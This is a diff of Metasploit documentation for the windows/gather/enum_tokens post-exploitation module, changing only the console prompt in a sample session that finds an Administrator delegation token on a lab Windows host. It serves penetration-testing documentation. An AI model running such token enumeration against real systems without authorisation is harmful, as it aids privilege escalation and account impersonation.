@@ -32,11 +32,11 @@ Attempt to get SYSTEM privilege on the target host. (default: `true`)
 ### Local Administrator session on Windows Server 2008 SP1 (x64)
 
 ```
-msf6 post(windows/gather/enum_tokens) > set session 1
+msf post(windows/gather/enum_tokens) > set session 1
 session => 1
-msf6 post(windows/gather/enum_tokens) > set getsystem false
+msf post(windows/gather/enum_tokens) > set getsystem false
 getsystem => false
-msf6 post(windows/gather/enum_tokens) > run
+msf post(windows/gather/enum_tokens) > run
 
 [*] Running module against WIN-17B09RRRJTG (192.168.200.218)
 [+] Found token for session 1 (192.168.200.218) - Administrator (Delegation Token)
